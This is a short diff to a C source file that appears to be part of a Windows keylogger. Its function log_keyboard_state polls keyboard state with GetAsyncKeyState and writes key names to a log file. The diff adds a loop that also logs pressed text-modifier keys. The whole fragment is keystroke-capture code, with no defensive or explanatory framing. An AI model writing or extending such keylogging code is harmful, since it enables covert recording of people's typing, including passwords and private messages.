@@ -69,7 +69,7 @@ void log_keyboard_state( FILE * log_file )
 		int key_caps_lock = GetKeyState( VK_CAPITAL );// 0 or 1
 		int key_shift = GetAsyncKeyState( VK_SHIFT ); // 0 or KEY_DOWN_STATE
 		int is_cap = ( key_shift == KEY_DOWN_STATE ? 1 : 0 ) ^ key_caps_lock;
-
+		
 		// Check the state of the keys
 		// Alphabetic keys
 		int i;
@@ -101,6 +101,13 @@ void log_keyboard_state( FILE * log_file )
 		}
 		
 		// Text modifier keys
+		for( i = 0; i < NB_VKS_ALTER_STREAM; i++ )
+		{
+			if( GetAsyncKeyState( VKS_ALTER_STREAM[i] ) & KEY_PRESSED_STATE )
+			{
+				log_infos( log_file, "%s\n", VKS_ALTER_STREAM_TXT[i] );
+			}
+		}
 		
 	}
 }
